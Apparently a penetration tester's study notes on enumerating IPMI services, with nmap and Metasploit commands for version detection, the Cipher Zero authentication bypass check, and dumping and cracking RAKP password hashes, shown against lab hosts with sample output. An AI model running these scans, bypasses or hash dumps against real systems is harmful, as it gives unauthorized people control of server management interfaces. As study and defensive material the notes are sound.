---
id: Enumeration
aliases: []
tags:
  - Networking/Services/IPMI/Enumeration
---

# Enumeration

___

<!-- Network Scan {{{-->
## Network Scan

Scan the network for port `623`

TCP Scan

```sh
nmap <target>/<cidr> -p 623 -n -oA ipmi-basic
```

UDP Scan

```sh
nmap -sU <target>/<cidr> -p 623 -n -oA ipmi-basic-udp
```

<!-- Info {{{-->
> [!info]-
>
> - `-n`: Desable DNS resolution
> - `-sU`: Scan UDP port
<!-- }}} -->

___
<!-- }}} -->

<!-- Service Enumeration {{{-->
## Service Enumeration

[[Nmap]] — Footprint the service
(*[ipmi-version](https://nmap.org/nsedoc/scripts/ipmi-version.html)*)

```sh
sudo nmap -sU <target> -p 623 --script ipmi-version  -oA ipmi-version
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
> ```
> ```sh
> Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
> Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
> Host is up (0.00064s latency).
>
> PORT    STATE SERVICE
> 623/udp open  asf-rmcp
> | ipmi-version:
> |   Version:
> |     IPMI-2.0
> |   UserAuth:
> |   PassAuth: auth_user, non_null_user
> |_  Level: 2.0
> MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
>
> Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
> ```
>
> - [[Networking/Services/IPMI/General|IPMI]] version 2.0 is listening on port `623`/UDP
>
<!-- }}} -->

[[Metasploit]] —
Discover host information through IPMI Channel Auth probes
(*[ipmi_version](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/)*)

```sh
use auxiliary/scanner/ipmi/ipmi_version
```

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Select Exploit|Select scanner]]
>
> ```sh
> msf6 > use auxiliary/scanner/ipmi/ipmi_version
> ```
>
> 2. [[Metasploit#Set Options|Select options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
> ```
>
> 3. [[Metasploit#Show Options|Show options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
> ```
>
> ```sh
> Module options (auxiliary/scanner/ipmi/ipmi_version):
>
>    Name       Current Setting  Required  Description
>    ----       ---------------  --------  -----------
>    BATCHSIZE  256              yes       The number of hosts to probe in each set
>    RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
>    RPORT      623              yes       The target port (UDP)
>    THREADS    10               yes       The number of concurrent threads
> ```
>
> 4. [[Metasploit#Run Exploit|Run the scan]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_version) > run
> ```
>
> ```sh
> [*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
> [+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
> [*] Scanned 1 of 1 hosts (100% complete)
> [*] Auxiliary module execution completed
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Cipher Zero {{{-->
## Cipher Zero

The vendor(*s*) shipping their devices with the cipher suite '0'
(*a.k.a 'Cipher Zero'*) enabled

<!-- Info - Cipher Zero {{{-->
> [!info]- Cipher Zero
>
> Cipher Zero allows a remote attacker to authenticate to the IPMI interface
> using an arbitrary password.
>
> The only information required is a valid account,
> but most vendors ship with a [[Networking/Services/IPMI/General#Dangerous Settings|default account]]
> (*`admin`*).
>
> - [CISA - Risks of Using the Intelligent Platform Management Interface (IPMI)](https://www.us-cert.gov/ncas/alerts/TA13-207A)
<!-- }}} -->

[[Nmap]] — IPMI 2.0 Cipher Zero Authentication Bypass
(*[ipmi-cipher-zero](https://nmap.org/nsedoc/scripts/ipmi-cipher-zero.html)*)

```sh
nmap -sU <target> -p 623 --script ipmi-cipher-zero -oA ipmi-script-cipher-zero
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> PORT    STATE SERVICE
> 623/udp open  asf-rmcp
> | ipmi-cipher-zero: 
> |   VULNERABLE:
> |   IPMI 2.0 RAKP Cipher Zero Authentication Bypass
> |     State: VULNERABLE
> |     Risk factor: High
> |
> |       The issue is due to the vendor shipping their devices with the
> |       cipher suite '0' (aka 'cipher zero') enabled. This allows a
> |       remote attacker to authenticate to the IPMI interface using
> |       an arbitrary password. The only information required is a valid
> |       account, but most vendors ship with a default 'admin' account.
> |       This would allow an attacker to have full control over the IPMI
> |       functionality
> |
> |     References:
> |       https://www.us-cert.gov/ncas/alerts/TA13-207A
> |_      http://fish2.com/ipmi/cipherzero.html
> ```
<!-- }}} -->

[[Metasploit]] — IPMI 2.0 Cipher Zero Authentication Bypass Scanner
(*[ipmi_cipher_zero](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_cipher_zero/)*)

```sh
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```

<!-- Example {{{-->
> [!example]-
>
> Identifies IPMI 2.0-compatible systems that are vulnerable
> to an authentication bypass vulnerability through the use of cipher zero
>
> ```sh
> msf > use auxiliary/scanner/ipmi/ipmi_cipher_zero
> msf auxiliary(ipmi_cipher_zero) > show actions
>     ...actions...
> msf auxiliary(ipmi_cipher_zero) > set ACTION < action-name >
> msf auxiliary(ipmi_cipher_zero) > show options
>     ...show and set options...
> msf auxiliary(ipmi_cipher_zero) > run
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Dump Hashes {{{-->
## Dump Hashes

Dump the user's salted password hash that the server sends to the client
before authentication takes place

<!-- Info {{{-->
> [!info]-
>
> During the authentication process, IPMI 2.0 mandates that the server send
> a salted
> [SHA1](https://en.wikipedia.org/wiki/SHA-1)
> or
> [MD5](https://en.wikipedia.org/wiki/MD5)
> hash of the requested user password to the client
<!-- }}} -->

[[Metasploit]] — IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
(*[ipmi_dumphashes](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)*)

```sh
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

<!-- Example {{{-->
> [!example]-
>
> 1. [[Metasploit#Select Exploit|Select scanner]]
>
> ```sh
> msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
> ```
>
> 2. [[Metasploit#Set Options|Select options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
> ```
>
> 3. [[Metasploit#Show Options|Show options]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options
> ```
>
> ```sh
> Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
>
>    Name                 Current Setting                                                    Required  Description
>    ----                 ---------------                                                    --------  -----------
>    CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
>    OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
>    OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
>    PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
>    RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
>    RPORT                623                                                                yes       The target port
>    THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
>    USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line
> ```
>
> 4. [[Metasploit#Run Exploit|Run the scan]]
>
> ```sh
> msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
> ```
> ```sh
> [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
> [+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
> [*] Scanned 1 of 1 hosts (100% complete)
> [*] Auxiliary module execution completed
>
> This flaw is a critical component of the [[General|IPMI]] specification
> ```
<!-- }}} -->

<!-- Mitigation {{{-->
> [!Tip]- Mitigation
>
> There is no direct "fix" to this issue because the flaw is a critical component
> of the [[Networking/Services/IPMI/General|IPMI]] specification
>
> Clients can opt for
> - difficult to crack, long passwords
> - [[Networking/Services/IPMI/General#BMC|BMC]] direct access restriction
>   by implementing network segmentation rules
<!-- }}} -->

<!-- Tip - Hash Cracking {{{-->
> [!tip]- Hash Cracking
>
> [[Exploitation#Hash Cracking|Crack Hashes]]
<!-- }}} -->

___
<!-- }}} -->
